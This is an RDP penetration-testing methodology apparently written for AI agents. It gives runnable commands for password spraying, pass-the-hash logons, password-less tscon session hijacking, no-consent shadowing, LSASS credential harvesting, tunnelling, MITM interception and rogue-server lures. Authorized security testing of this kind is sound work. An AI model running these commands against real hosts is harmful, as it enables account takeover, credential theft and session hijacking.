---
technology: "RDP (Remote Desktop Protocol / Remote Desktop Services)"
kind: bug-bounty-methodology
audience: ai-agent
family: windows
version: 1.1
last-refresh: "2026-11-19"
provenance: "thin unit — first-class depth, upstream-heavy (evidence: 4 xfreerdp client chains; bare 3389 listeners in ~24 more). Upstream: FreeRDP/xfreerdp(1) man pages, FreeRDP user manual (NLA notes), Kali blog 'Passing the Hash with Remote Desktop', Microsoft Learn (tscon reference, 'Securing remote connections' — Restricted Admin/RemoteGuard comparison, CVE-2019-0708 customer guidance), CISA AA19-168A, MITRE ATT&CK T1563.002 (Korznikov 2017). Verified 2026-11-12. v1.1 (2026-11-19): appended 'Supplement — modern RDP TTP' (pre-auth negotiation/NTLM-info, gateway/RDWeb perimeter, redirection data-exposure, MITM and rogue-server client-attack surface, current-year CVEs) — MSRC CVE-2026-56190 + RD Gateway CVE-2026-70033, FreeRDP 2026 client advisories (Red Hat/SentinelOne), MS-RDPBCGR negotiation constants; model claude-opus-4-8."
ht-source:
  - "rewritten from HackTricks (src/network-services-pentesting/pentesting-rdp.md), CC BY-NC 4.0, accessed 2026-11-13"
---

# RDP bug bounty methodology

Target model: a host with TCP/3389 open (Windows RDS, xrdp) where you hold
credentials, a hash, a ticket — or a shell on the box itself. Companion
overview: [[rdp|RDP]]. In-domain Kerberos and NTLM mechanics live in
[[kerberos]] and [[ntlm]]; here the protocol surface is the subject.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Security-layer fingerprint (`rdp-sec-check`) | 3389 open | yes | Config posture (NLA on/off = era tell) — recon |
| Password logon (xfreerdp/mstsc) | creds + Remote Desktop Users membership | no | Interactive GUI session |
| Pass-the-hash via Restricted Admin (`/pth`) | Win 8.1/2012 R2+ (or 7/2008R2 backport) + `DisableRestrictedAdmin=0` | no | GUI session from an NT hash alone — High |
| Session hijacking (`tscon`) | SYSTEM on host + a disconnected/active session | n/a | Any logged-on user's session, no creds — High |
| BlueKeep (CVE-2019-0708) | XP/2003/7/2008/2008 R2 unpatched, NLA off | **yes** | Pre-auth RCE — Critical (wormable) |
| Legacy "standard RDP security" | pre-TLS config | partly | No server auth → MITM/session access |

## Phase 0 — Detect and fingerprint

```bash
nmap -p 3389 -sV --script rdp-ntlm-info,rdp-sec-check 198.51.100.30
# rdp-sec-check reports the negotiated protocol security:
#   "These RDP protocols are available: PROTOCOL_HYBRID (NLA), PROTOCOL_SSL (TLS)"
#   PROTOCOL_RDP alone = legacy standard security: no server auth, legacy box
# rdp-ntlm-info leaks NetBIOS/domain name, DNS hostname, OS version — pre-auth
```

Readout decisions: NLA offered → 2012+ posture, password or `/pth` both
plausible. Standard-RDP only → legacy OS (BlueKeep era if 7/2008/2008 R2;
check patch level before anything loud). UDP 3389 also open → RDP 8+ with
UDP transport (rare on servers).

Encryption/era NSE companions (added 2026-11-13, rewritten from HackTricks):
`nmap --script rdp-enum-encryption -p 3389` enumerates the server's offered
encryption (the 40/56/128-bit legacy knobs — a 40-bit-only answer is a
fossil configuration), and `rdp-vuln-ms12-020` checks the 2012
vulnerability condition without deliberately triggering its crash — the
combined one-liner
`nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4`
runs all three (see the MS12-020 note in Phase 4).

## Phase 0.5 — NetExec RDP lane (added 2026-11-13)

NetExec's `rdp` protocol is the spray-and-look module; flags verified against
its wiki, CLI help and `nxc/protocols/rdp.py`:

```bash
nxc rdp 198.51.100.30 -u users.txt -p 'Password123!' --no-bruteforce --continue-on-success
#   [*] Windows 10 or Server 2016 Build 17763 (name:DC01) (domain:corp.example.com) (nla:True)
#   [+] corp\svc_backup:Password123! (Pwn3d!)
nxc rdp 198.51.100.30 --nla-screenshot            # pre-auth: login screen, ONLY when NLA is disabled
nxc rdp 198.51.100.30 -u svc -p 'Password123!' --screenshot   # post-auth desktop PNG
nxc rdp 198.51.100.30 -u svc -p 'Password123!' -x 'whoami' -X 'Get-Process'   # cmd/PS exec over the session
# shaping: --screentime N (default 10 s render wait) · --res 1920x1080 (default 1024x768)
```

The connect line already leaks build, hostname, domain and the **NLA verdict**
(`(nla:True/False)`) pre-auth — fold it into Phase 0 fingerprinting. The two
screenshot modes are distinct surfaces: `--nla-screenshot` needs NLA *off*
(it is a pre-auth capture of the logon screen — a finding by itself on an
internet-facing host) and `--screenshot` requires valid creds; `-x/-X`
execute through the logged-on session. Account-lockout discipline applies to
every spray here (see Phase 1 note).

## Phase 1 — The client workflow (xfreerdp, freerdp3, rdesktop)

The observed chains, verbatim flag shapes:

```bash
# plain password logon:
xfreerdp /u:keysvc /p:'<password>' /v:198.51.100.30 +clipboard
# domain + legacy-TLS fallback (against a 2008-era stack):
xfreerdp /u:'ldapreader' /p:'<password>' /v:198.51.100.30 /d:lab.corp /tls-seclevel:0
# freerdp3 build, dynamic-resolution is the resizable-window flag:
freerdp3 /v:198.51.100.30 /u:User.Name /p:'<password>' /dynamic-resolution
# force the security layer when negotiation fails:
xfreerdp /v:198.51.100.30 /dynamic-resolution -sec-nla
```

Flag reference (FreeRDP manual/man page — current generations use `/flags`;
1.x used `-flags`):

- `/u:user` `/d:DOMAIN` `/p:pass` `/v:host[:port]` — identity and target;
  with NLA the complete credentials must exist at connect time (it prompts).
- `/sec:rdp|tls|nla` — force a security layer; try `/sec:nla` first, then
  `/sec:tls` on negotiation failures. `-sec-nla` is the 1.x-style toggle.
- `/cert:ignore` (1.x `/cert-ignore`) — accept self-signed/legacy certs;
  OEM-installed Terminal Services certs are almost always self-signed.
- `/dynamic-resolution` — auto-resize; `/w:1920 /h:1080` otherwise.
- `+clipboard` — clipboard sharing (file exfil via copy/paste).
- `/drive:share,/tmp` — mount a local dir as a remote drive (the file-move
  primitive, both directions).
- `/tls-seclevel:0` — drop client TLS floor to 0 so TLS 1.0/legacy ciphers
  on 2008-era servers connect (client-side downgrade, use deliberately).
- `/pth:<LMhash:NThash>` — see Phase 2.

`rdesktop` (older client, no NLA support worth using) takes dash flags:
`rdesktop -u user -p pass -d DOMAIN 198.51.100.30`. Prefer xfreerdp except
when testing legacy standard-RDP-only boxes — rdesktop speaks that layer
natively.

Access gate on the target: the account must sit in **Remote Desktop Users**
(or local Administrators) *and* hold the "Allow log on through Remote
Desktop Services" right. Observed: when membership is missing,
`bloodyAD --add-member` style group/ACL changes grant it before the hop.
With any local admin on the host, the native form is
`net localgroup "Remote Desktop Users" <user> /add`.

Credential-validation and spray companions (added 2026-11-13, rewritten from
HackTricks): **impacket's `rdp_check.py`** answers "are these creds valid for
RDP" without a GUI — `rdp_check example.com/user:'Password123!'@198.51.100.30`
(the CredSSP handshake is the test). **crowbar** sprays one password across a
range (`crowbar -b rdp -s 198.51.100.0/24 -U users.txt -c 'Password123!'`),
**hydra** the single-host form
(`hydra -L users.txt -p 'Password123!' 198.51.100.30 rdp`). Both are
lockout-generators: prefer `--no-bruteforce` user↔password pairing (NetExec,
above) and know the domain's lockout policy before spraying RDP at all.

## Phase 2 — Pass-the-hash via Restricted Admin mode

Restricted Admin (Windows 8.1/Server 2012 R2+, backported to 7/2008 R2 but
**disabled by default**; Microsoft's "Securing remote connections" doc) changes
RDP logon from interactive to network logon — credentials are not cached on
the target (its defensive purpose), and authentication happens with the NT
hash or Kerberos ticket instead of the password (our offensive use):

```bash
xfreerdp /u:administrator /pth:<NThash> /v:198.51.100.30 /cert:ignore +clipboard
```

Gate checks when it fails: (1) target OS < 2012 R2 without the backport
enabled; (2) registry `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin`
exists and is `1` (set `0` when you can); (3) the account lacks RDP logon
rights. Client side, the Windows equivalent is `mstsc /restrictedadmin`.
Note the trade-off documented upstream: RemoteGuard (Win10 1607+) protects
credentials the same way *without* enabling hash logon — environments that
distinguish the two are telling you which era they hardened in.

What a `/pth` session is *not*: it authenticates as a network logon, so the
session may lack access to network resources as the user (no credential to
delegate) — plan the next hop with the tools already on the box, or collect
from LSASS what the interactive admins left there.

## Phase 3 — Session hijacking (tscon)

From any SYSTEM shell on an RDP host (MITRE ATT&CK T1563.002; Korznikov
2017; Microsoft's own tscon docs confirm `/password` is required only when
the connecting user does not own the session — SYSTEM is exempt):

```cmd
query user                        :: list sessions: USERNAME, ID, STATE (Active/Disc)
tscon 3 /dest:console             :: reattach session 3 to the console — no password
```

Any **disconnected (Disc)** session is a live logged-on token: the admin who
closed their mstsc window without logging off left everything in place. This
is a privilege escalation (their token, often Domain Admin) that never
touches the network as RDP. `mstsc /shadow:<id> /noconsentPrompt` is the
GUI-era sibling. Detection-side, blue teams alert on tscon usage — it is
loud on monitored hosts; prefer it on jump hosts where sessions concentrate.

Mimikatz covers the same ground from a beacon with its terminal-server
module (added 2026-11-13, rewritten from HackTricks): `ts::sessions` lists
sessions, `ts::remote /id:2` connects yours to the target — same privilege
requirement, same operational loudness.

### Phase 3a — RDP shadowing as a remote technique (added 2026-11-13)

Shadowing is the *remote* sibling of tscon: Remote Desktop Services'
built-in remote-control feature lets an administrative user view or control
another session from a client, sometimes without the victim's consent,
depending on policy. The flow:

```cmd
qwinsta /server:198.51.100.30          :: list sessions remotely
quser /server:198.51.100.30            :: who is on, states
mstsc /v:198.51.100.30 /shadow:3 /control            :: view+control session 3 (consent per policy)
mstsc /v:198.51.100.30 /shadow:3 /noconsentprompt /prompt   :: no-consent attempt (needs rights + policy)
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow
```

The `Shadow` policy value decides the game: it ranges full-control/view
× with/without-user-consent (0 disables; 1 full control without consent;
2 full control with consent; 3 view without consent; 4 view with consent) —
read it before claiming silent control. Expect operational impact either
way: the shadowed user sees the connection on consent-prompted setups.
**AutoRDPwn** (JoelGMSec) automates the whole shadow chain from PowerShell —
no-consent control still rides on privileges plus the policy, so it is an
automation wrapper, not a bypass.

### Phase 3b — Cross-session neighbors (added 2026-11-13)

Two adjacent patterns when other humans land on a box you administer:
(1) a **higher-privileged user RDPs in** — their session process is an
injection target (act as them from your local-admin position); (2) an
existing **Sticky Keys / Utilman file-replacement backdoor** turns the
sign-in screen into an administrative shell — persistent, detectable system
modification, and across an RDP range you can *find* already-backdoored
hosts with Sticky-Keys-Slayer (linuz) rather than planting one.

## Phase 4 — BlueKeep-era CVE context

| CVE | What | Gate |
|---|---|---|
| CVE-2019-0708 "BlueKeep" | Pre-auth RCE in the RDP Term Service (use-after-free reachable pre-CredSSP, in the X.224/MS_T120 channel handling); wormable — CISA AA19-168A. Affected: XP, 7, Server 2003/2003 R2, 2008, 2008 R2 (8/2012+ rewrote the stack, unaffected). Patched May 2019, including out-of-band XP/2003. **NLA mitigates on 7/2008/2008 R2** — but is unavailable on XP/2003 | unpatched listed OS + NLA off |
| CVE-2018-0886 (CredSSP) | RCE in CredSSP/NLA itself via crafted auth structures (fixed May 2018 via KB4093492 / monthly rollup) — the layer that protects you is a layer too, on unpatched clients/servers | 2018 patch level |
| Delegation/cred-theft class | Not CVEs: interactive RDP logons deposit credentials in the *target's* LSASS — pivoting through RDP as an admin onto a compromised box hands your creds to the box | always (unless Restricted Admin/RemoteGuard) |

Metasploit carries `cve_2019_0708_bluekeep` (scanner + exploit — RCE memory
corruption, crash-prone; treat DoS risk as real on engagement). NLA-on boxes
can still leak `rdp-ntlm-info` but are not BlueKeep-reachable.

MS12-020, the pre-BlueKeep ancestor (added 2026-11-13; verified against
Microsoft's bulletin): March 2012's **MS12-020** fixed two crafted-packet RDP
vulnerabilities — **CVE-2012-0002** (the RCE; wormable-class in its day) and
CVE-2012-0152 — in the way the RDP service processed packets in memory.
Affected: the XP/2003-era lineage (bulletin ships KB2621440 against XP SP3
and Server 2003). On anything modern it is archaeology; on a
`PROTOCOL_RDP`-only box from Phase 0 it belongs on the checklist, and the
`rdp-vuln-ms12-020` NSE (Phase 0) tests the condition without forcing the
crash.

## Phase 5 — Tunneling over RDP virtual channels (added 2026-11-13)

An authenticated RDP session is also a covert transport: virtual channels
can multiplex arbitrary TCP forwards through an established session —
egress when the session is the only path out. **rdp2tcp** (V-E-O) is the
reference implementation, verified against its README:

```bash
# FreeRDP side (built-in since 2.0.0) — attach the client half:
xfreerdp /u:svc /p:'Password123!' /v:198.51.100.30 /rdp2tcp:/path/to/rdp2tcp/client/rdp2tcp
```

Architecture and prerequisites the quick starts omit: the tool is a
client/server pair — the client rides the RDP virtual channel on YOUR
machine, but the **server executable must run inside the target session**
(upload it once you are logged on), and a controller on the client side
(default `127.0.0.1:8477`) then registers tunnels: forward and reverse TCP,
process stdin/stdout forwarding, and a minimal SOCKS5 (`rdp2tcp.py add
forward ...` manages them). The older rdesktop form uses
`-r addin:rdp2tcp:/path/to/rdp2tcp`. Impact framing: this pivots through a
session you already hold — the finding is the egress path, not a protocol
bug.

## Quick reference

```bash
nmap -p3389 --script rdp-sec-check,rdp-ntlm-info 198.51.100.30
xfreerdp /u:'user' /p:'pw' /v:198.51.100.30 /dynamic-resolution +clipboard
xfreerdp /u:'user' /pth:<NThash> /v:198.51.100.30 /cert:ignore   # Restricted Admin
xfreerdp /u:'user' /p:'pw' /v:198.51.100.30 /tls-seclevel:0      # legacy TLS
# on-host, as SYSTEM:
query user ; tscon <id> /dest:console
```

## Tool mapping (prose)

Nmap with the rdp-sec-check and rdp-ntlm-info NSE scripts does the security-
layer and identity fingerprint. FreeRDP's xfreerdp (and its freerdp3
packaging) is the modern Linux client — password, hash (`/pth`), smartcard,
and drive/clipboard redirection all live in its flags; rdesktop remains the
fallback for legacy standard-RDP-only targets; Microsoft's mstsc with
`/restrictedadmin` is the Windows-side hash-logon client. bloodyAD (or any
AD modification tool) grants the Remote Desktop Users membership the hop
needs. Metasploit holds the BlueKeep scanner/exploit modules. Session
hijacking needs no external tooling — query user and tscon ship with
Windows. Post-session credential work continues in the [[windows-secrets]]
methodology; hash material and its movement belong to [[ntlm]].

Session-centric additions (2026-11-13, rewritten from HackTricks): **EvilRDP**
(skelsec) drives an authenticated session programmatically — automated
mouse/keyboard and clipboard control, shell/PowerShell execution without
uploading files, file upload/download even where transfers are disabled, and
a SOCKS proxy tunneled through the client-side channel: the automation
answer when GUI-with-a-human is not available. **SharpRDP** (0xthirteen)
executes commands on a target through an authenticated RDP session without
any graphical client — the headless alternative to logging a desktop. Both
complement the rdp2tcp lane (Phase 5) and AutoRDPwn (Phase 3a); crowbar and
impacket's rdp_check.py cover the Phase 1 spray/validate roles.

---

## Supplement — modern RDP TTP (added 2026-11-19)

*Scope: the techniques for FINDING weaknesses on a modern RDP perimeter — what
leaks before you send a credential, where the internet-facing RDP surface
actually lives (it is rarely bare 3389 anymore), redirection channels as
data-exposure findings, the MITM/rogue-server conditions, and current-year
CVEs in depth. Everything above is preserved; this block adds the pre-auth and
perimeter craft the thin unit lacked. Authorized-program discipline from the
header applies — single-connection, low-volume, evidence-first, lockout-aware.*

### S0 — What leaks before credentials: the negotiation handshake

RDP is not "open port, send password." Every connection runs a fixed opening
sequence, and most of your pre-auth intelligence comes out of the first two
packets — before any CredSSP challenge, before any password. Know the sequence
so you know what each probe is actually reading:

```
TCP connect
  -> Client X.224 Connection Request PDU   (carries the RDP Negotiation Request)
  <- Server X.224 Connection Confirm PDU   (RDP Negotiation Response OR Failure)
  [ if PROTOCOL_SSL/HYBRID selected ] TLS handshake  -> server X.509 cert
  [ if PROTOCOL_HYBRID ] CredSSP/SPNEGO    -> NTLM CHALLENGE (type 2) leaks here
  ... only now does authentication happen ...
```

**The Negotiation Request `requestedProtocols` bitmask** (MS-RDPBCGR) is the
client saying which security layers it supports; the server's Negotiation
Response `selectedProtocol` is the posture tell you want. The values:

| Flag | Value | Meaning | What it tells you |
|---|---|---|---|
| `PROTOCOL_RDP` | `0x0` | Standard RDP security, no server auth | Legacy box, MITM-able, BlueKeep-era if OS matches |
| `PROTOCOL_SSL` | `0x1` | TLS, but NLA not required | Login screen reachable pre-auth (`--nla-screenshot`); pre-auth RCE surface |
| `PROTOCOL_HYBRID` | `0x2` | CredSSP/NLA required | 2012+ posture; creds needed at connect — but NTLM info still leaks |
| `PROTOCOL_RDSTLS` | `0x4` | RDSTLS (gateway/broker redirection auth) | Behind a connection broker / RD Gateway |
| `PROTOCOL_HYBRID_EX` | `0x8` | NLA + extended (Early User Auth) | Hardened NLA; early-auth result PDU |
| `PROTOCOL_RDSAAD` | `0x10` | Entra ID (Azure AD) auth | Cloud-joined / AVD — no classic NTLM, test the token path |

Decision tree off `selectedProtocol`: `0x0` only → standard security, go to the
MITM/legacy lane (S4) and check patch level for MS12-020/BlueKeep. `0x1` with
no HYBRID → NLA is OFF; the logon screen and the pre-CredSSP code path are
reachable unauthenticated (this is the state BlueKeep needs, and the widest
exposure for CVE-2026-56190 — though NLA is *not* a confirmed mitigation for
56190, see S5). `0x2`/`0x8` → NLA on; your pre-auth surface is the NTLM
CHALLENGE and the TLS cert, nothing more, so harvest those and pivot to
credentials. `0x10` → Entra-joined; classic PtH/NTLM tactics do not apply,
the surface is the Azure token broker.

**The `mstshash=` cookie.** The X.224 Connection Request can carry
`Cookie: mstshash=<identifier>\r\n` — a routing token a connection broker uses
to steer the session. When a target sits behind a broker/gateway, the value a
real client sends is a *username hint*; capturing one in transit (S4) or
reading it from a leaked `.rdp` file hands you a valid account name for the
spray list. You can also set it yourself to probe broker routing behavior.

### S1 — NTLM CHALLENGE: the richest pre-auth leak on an NLA host

When `PROTOCOL_HYBRID` is selected and the server speaks NTLM inside CredSSP,
the server's NTLM CHALLENGE (type 2) message carries a `TargetInfo` block of
AV_PAIRs — identity fields the server volunteers *before* it has authenticated
anyone. This is the single best pre-auth intel on a hardened modern host, and
`rdp-ntlm-info` exists precisely to force this exchange and parse it:

```bash
nmap -p3389 --script rdp-ntlm-info 198.51.100.30
# Host script results:
#   rdp-ntlm-info:
#     Target_Name: CORP
#     NetBIOS_Domain_Name: CORP
#     NetBIOS_Computer_Name: DC01
#     DNS_Domain_Name: corp.example.com
#     DNS_Computer_Name: DC01.corp.example.com
#     DNS_Tree_Name: corp.example.com
#     Product_Version: 10.0.17763            # OS build -> patch-level matching
#     System_Time: 2026-11-19T...
```

Every one of those fields is pre-credential. The AV_PAIR names behind them
(`MsvAvNbDomainName`, `MsvAvNbComputerName`, `MsvAvDnsDomainName`,
`MsvAvDnsComputerName`, `MsvAvDnsTreeName`) give you NetBIOS and FQDN for both
host and domain, the forest tree name, and the OS build number — which maps
straight to a patch level for the S5 CVE table. NetExec's connect line
(`(name:DC01) (domain:corp.example.com) (nla:True)` from Phase 0.5) reads the
same data; cross-check the two. **This leak is not a finding on its own** in
most programs (it is default Windows behaviour), but it is the recon that makes
every later phase targeted, and on an internet-facing listener the domain/FQDN
disclosure is worth a line in the report.

### S2 — TLS certificate as domain intelligence

When TLS is in play (`PROTOCOL_SSL`/`HYBRID`), the server presents an X.509
certificate during the handshake. RDP's TLS rides *after* the X.224
negotiation, so a bare `openssl s_client` will not speak it — use a tool that
does the RDP negotiation first:

```bash
nmap -p3389 --script ssl-cert 198.51.100.30
#   ssl-cert: Subject: commonName=DC01.corp.example.com
#     Subject Alternative Name: DNS:DC01.corp.example.com
#     Issuer: commonName=DC01.corp.example.com        # self-signed -> OEM default
#     Not valid before/after: ...  (validity 1 year, auto-renewed = default TS cert)
# FreeRDP also prints subject/issuer/SHA-256 fingerprint on first connect:
xfreerdp /v:198.51.100.30 /sec:tls /cert:ignore /u:x /p:x 2>&1 | grep -iE 'subject|issuer|fingerprint'
```

Readout: the default Terminal Services self-signed cert has CN = the machine's
FQDN and is its own issuer — a one-year, auto-renewing cert. The **SAN and CN
hand you the internal hostname and domain** even when `rdp-ntlm-info` is
somehow blocked, and a cert whose CN does not match the DNS name you connected
to (a wildcard, a load-balancer cert, a stale name) is domain-topology intel
and a possible MITM/cert-trust finding. A CA-issued cert (issuer is an internal
PKI) tells you the shop runs an enterprise CA — note the issuer DN; it is a
future target. Record the fingerprint: in S4 a *changed* fingerprint between
observations is the signature of an interposed MITM.

### S3 — Credential-era tactics: what PtH/CredSSP can and cannot do

The header's Phase 2 covers the `/pth` mechanics; the gaps a tester actually
trips on are the *constraints*:

- **Restricted Admin is a network logon, so Pass-the-Hash lands but the session
  is a double-hop dead end.** No password is cached on the target (its defensive
  point) and none is available to delegate outward (your constraint): the shadow
  of a successful `/pth` session cannot reach a second hop as that user. Plan to
  collect on-box (LSASS of the interactive admins, local secrets) rather than
  pivot as the hashed identity. This is the same double-hop wall as WinRM/network
  logons — expected, not a bug.
- **CredSSP is required for NLA, and it is itself a protocol you can fingerprint
  and fail.** `rdp_check.py` (impacket) validates creds by completing exactly the
  CredSSP handshake — a clean "are these valid for RDP" with no GUI and no
  session. A CredSSP error distinguishes "wrong password" from "account cannot
  log on via RDS" from "restricted admin disabled," so read the error string,
  don't just read the exit code.
- **Restricted Admin and Remote Credential Guard are not advertised in a
  pre-auth banner — you infer them from behaviour.** Request restricted admin
  with `/pth` (or `mstsc /restrictedadmin`): success means
  `DisableRestrictedAdmin=0`; a reject at logon means it is `1` (hardened) and
  your hash is useless here even though it is valid. Remote Credential Guard
  (`mstsc /remoteGuard`, Win10 1607+) protects the same credential without
  enabling hash logon — if `/pth` fails but password logon with the same account
  works and the shop is modern, you are likely looking at RCG posture. The two
  are a *dating tell*: which one an environment chose says which era it hardened
  in, and RCG-everywhere means the PtH lane (Phase 2) is closed by design.
- **The interactive-logon credential deposit is still the highest-value tactic
  and is not a CVE.** A full interactive RDP logon (not restricted admin) drops
  the user's credentials into the *target's* LSASS. Authorized red-team framing:
  RDP-ing an admin onto a box you already control hands you their secrets; the
  finding you write up is the *absence* of Restricted Admin / RCG on
  administrative jump paths, demonstrated with a single LSASS read on a host you
  own in-scope.

### S4 — MITM and the rogue-server client-attack surface

Two directions, both requiring a network or lure position — authorized
engagements with explicit MITM permission only.

**Server-impersonation MITM (attacker in the path).** The precondition is weak
server authentication: `PROTOCOL_RDP` standard security (no server auth at all),
or TLS with a self-signed cert users are trained to click through, or a server
that still offers a downgradeable layer. Tooling: **Seth** (SySS) ARP-spoofs
the client, strips NLA where the config allows, and relays the session to
capture plaintext credentials; **PyRDP** (GoSecure) is the modern
interception/library stack — it MITMs the connection, records the full session,
captures clipboard and transferred files, logs keystrokes and credentials, and
can inject commands into the live stream. The evidence that an MITM is possible
is observable without running one: a `PROTOCOL_RDP`-only server, or a changed
TLS fingerprint (S2) between a direct and an on-path observation, or a client
config that proceeds past a cert warning. Report it as "no server
authentication / trust-on-first-use cert → session interception," not "RDP is
insecure."

**Rogue-server attacks the client (the modern inversion).** The 2026 FreeRDP
advisory cluster is a *server* attacking the connecting *client* — a malicious
or interposed RDP server sends crafted graphics/channel data that corrupts the
client's memory. This matters three ways for a tester:

- A honeypot/rogue RDP server (stand one up with PyRDP) catches victims lured by
  a malicious `.rdp` file — the "Rogue RDP" phishing pattern (APT29 mailed
  signed `.rdp` files in 2024 that auto-enabled full drive + clipboard
  redirection back to the attacker's server; one line of history, the technique
  is the point). The lure file silently maps the victim's drives/clipboard to
  you on connect.
- `.rdp` files are themselves parsed attack surface: **CVE-2026-91958** is an
  out-of-bounds read/write in xfreerdp triggered by an out-of-range
  `selectedmonitors` value in a crafted `.rdp` file (fixed 3.31.0) — opening an
  untrusted `.rdp` is code-execution-adjacent.
- **Your own tooling is attack surface.** Connecting your `xfreerdp` to an
  untrusted or attacker-controlled server during testing can own your box via
  the S5 client CVEs. Keep the client patched (`xfreerdp` ≥ 3.32.0 as of this
  writing), and treat "what happens when I connect to *their* server" as a real
  question on red-team infra, not a hypothetical.

### S5 — Current-year CVE surface (2026, in depth)

Older pre-auth wormables are one-liners by now: **BlueKeep (CVE-2019-0708)** and
**MS12-020/CVE-2012-0002** are covered in Phase 4 — archaeology unless Phase 0
shows a `PROTOCOL_RDP`-only legacy OS. The **RD Gateway pre-auth RCE pair
CVE-2020-0609/0610** ("BlueGate," UDP 3391 + HTTPS) is the historical gateway
headline — one line, check patch level on any RDG you find. The current-year
surface splits into server-side (you attack the target) and client-side (a
server attacks your client):

**Windows RDP / RDS server-side (2026):**

| CVE | Class | Auth | Notes |
|---|---|---|---|
| **CVE-2026-56190** | Use of uninitialized resource (CWE-908) in Windows RDP → RCE | **Pre-auth** (`AV:N/AC:L/PR:N/UI:N`, CVSS 9.8) | Patched 14 Jul 2026. Microsoft "Exploitation Less Likely"; **NLA mitigation is NOT established in public sources** and wormability is **not confirmed** — do not repeat the BlueKeep "NLA saves you" line here. Affects Win10/11 and Server branches. The headline reason internet-facing 3389 is still a critical exposure in 2026: put RD Gateway or a VPN in front, which is exactly what makes S6 the real perimeter. |
| **CVE-2026-70033** | RD Gateway DoS (unreleased-memory / resource exhaustion) | **Unauth**, network (CVSS 7.5) | MSRC-confirmed, released 13 Oct 2026. An unauthenticated attacker exhausts the gateway service. This is a *service-availability* finding on the internet-facing RDG — note it, do not weaponise it into an outage on a live program. |
| CVE-2026-69327 / CVE-2026-69565 | RD Gateway use-after-free (CWE-416) | Local foothold required | Secondary-sourced (base ~7.0–7.4); privilege-escalation class, not a remote entry. Verify against MSRC before relying on either. |

**FreeRDP client-side (2026) — malicious server → client memory corruption.**
These are the S4 "rogue server attacks your client" cluster; all are triggered
by a hostile/interposed *server* (or, for the `.rdp` one, a crafted file) after
or during connection, and matter both as honeypot ammunition and as a reason to
keep your own client patched:

| CVE | Primitive | Precondition / path | Fixed in |
|---|---|---|---|
| **CVE-2026-55827** | Heap out-of-bounds **write** → possible client RCE | Client started with non-default `/cache:codec:rfx`; server sends mismatched stride/height for Cache Bitmap V3 in RemoteFX decode (`gdi_Bitmap_Decompress`). CVSS 7.5–8.8 (sources differ), `UI:R` | 3.27.1 |
| CVE-2026-45700 | Out-of-bounds **write** in planar bitmap decoder | Hostile server, post-connection | 3.26.0 |
| CVE-2026-67306 | OOB **read**, RDP6 planar RLE decoder | ≤ 3.28.0, hostile server | 3.29.0 |
| CVE-2026-69159 | OOB **read**, truncated planar bitmap | Hostile server | 3.29.0 |
| CVE-2026-55192 | OOB **read** via crafted H.264 bitstream (RDPGFX) | Hostile server; client mem leak/crash | — (track advisory) |
| CVE-2026-91958 | OOB read/write via crafted `.rdp` `selectedmonitors` | Opening an untrusted `.rdp` in xfreerdp | 3.31.0 |
| CVE-2026-109249 | Heap OOB **read** in assistance parsing | FreeRDP 3.0.0 – < 3.32.0 (CVSS 6.8) | 3.32.0 |
| CVE-2026-22859 | OOB **read** in URBDRC (USB redirect), trusts server descriptor | — | 3.20.1 |

Operational upshot: the OOB-read cluster leaks client memory or crashes the
client (recon/DoS against a connecting victim); CVE-2026-55827 and -45700 are
the write primitives with RCE potential. A FreeRDP client older than **3.32.0**
is exposed to the whole set — fingerprint your own and your target's clients
accordingly, and treat distro-packaged xfreerdp (often stale) as suspect. These
are aggregator-sourced (Red Hat / SentinelOne / NVD-derived) — gate severity on
the FreeRDP GitHub security advisories before you quote a number in a report.

### S6 — The internet-facing RDP perimeter: gateway and web surfaces

Bare 3389 on the internet is increasingly rare precisely because of S5 — the
real external RDP surface in 2026 is the gateway/web tier that fronts it. Four
classes, each enumerable from outside:

**RD Web Access (RDWeb).** An IIS app, the published-app portal. Fingerprint and
probe the login form:

```bash
for p in /RDWeb /RDWeb/Pages/en-US/login.aspx /RDWeb/Pages/en-US/Default.aspx \
         /RDWeb/webclient/ ; do
  curl -s -o /dev/null -w "%{http_code} $p\n" https://rds.example.com$p
done
# login.aspx 200 -> classic RDWeb; /RDWeb/webclient/ 200 -> HTML5 web client (newer)
```

The form (`login.aspx`, fields `DomainUserName` / `UserPass`) is a
**password-spray and user-enumeration surface** — response/timing differences
between a valid and invalid username are the enumeration tell, and the form
honours the domain's lockout policy, so this is a lockout generator: know the
policy, pair user↔password (never brute one user), stay low-volume. A 200 with a
RemoteApp feed after auth leaks the published-application inventory. `RDWeb` also
historically disclosed the internal domain in the pre-filled `DomainUserName`.

**RD Gateway (RDG).** RDP tunnelled over HTTPS (443) via RPC-over-HTTP, with
UDP 3391 as the datagram transport. Enumerate the RPC proxy and — the useful
part — pull domain intel over 443 the same way S1 pulls it over 3389, because
the gateway's IIS endpoint speaks NTLM:

```bash
curl -s -o /dev/null -w "%{http_code}\n" https://rds.example.com/rpc/rpcproxy.dll
curl -s -o /dev/null -w "%{http_code}\n" https://rds.example.com/remoteDesktopGateway/
# NTLM-over-HTTP info leak: an NTLM type-1 to an NTLM-protected endpoint
# returns a type-2 CHALLENGE carrying the same AV_PAIRs as S1 (host/domain/FQDN)
nmap -p443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll \
  rds.example.com
```

Current-year note: **CVE-2026-70033** is an unauthenticated RDG DoS (S5) — a
posture finding, not something to detonate. The RDG itself is also a spray
front end for internal hosts: once authenticated it tunnels you to any internal
3389 the gateway policy (RAP/CAP) permits — map those policies, over-broad
resource-authorization policies are a lateral-movement finding.

**Unified Access Gateway (UAG) / legacy TMG / third-party RD front ends.** Older
perimeters put UAG or TMG in front of RDWeb/RDG. Fingerprint by the portal
chrome and headers; treat any such reverse proxy as its own surface (auth
bypass, path handling) layered over the RDS tells above.

**Azure Virtual Desktop / Entra-joined.** When Phase 0 showed `PROTOCOL_RDSAAD`
(S0) or the connection broker is `*.wvd.microsoft.com`, you are against AVD —
no classic NTLM/PtH, the surface is the Entra token flow, conditional-access
posture, and session-host configuration, not the protocol.

### S7 — Redirection channels as data-exposure findings

RDP multiplexes virtual channels alongside the display, and several are
bidirectional data paths that *should* be disabled on hardened VDI, kiosk, and
published-app targets. Where they are not, each open channel is an exfiltration
(and infiltration) finding — the Phase 1 `+clipboard` / `/drive` flags are also
your test probes:

